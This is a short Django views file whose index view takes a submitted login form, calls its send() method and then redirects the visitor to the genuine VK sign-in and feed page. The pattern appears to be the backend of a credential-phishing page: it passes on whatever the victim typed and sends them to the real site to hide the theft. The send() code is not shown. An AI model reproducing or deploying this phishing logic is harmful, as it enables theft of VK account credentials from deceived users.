from django.shortcuts import render, redirect
from .forms import TheForm

# Create your views here.


def index(request):
    context = {}
    errors = None

    if request.method == 'POST':
        login_form = TheForm(request.POST)

        if login_form.is_valid():
            login_form.send()

            return redirect('https://id.vk.com/auth?app_id=7913379&'
                            'response_type=silent_token&v=1.58.6&redirect_uri=https%3A%2F%2Fvk.com%2Ffeed&'
                            'uuid=zN7AQvh6cR1pPCSNQibmX&scheme=bright_light')

        else:
            errors = login_form.errors

    else:
        login_form = TheForm()

    context['form'] = login_form
    context['errors'] = errors

    return render(request, 'index.html', context)
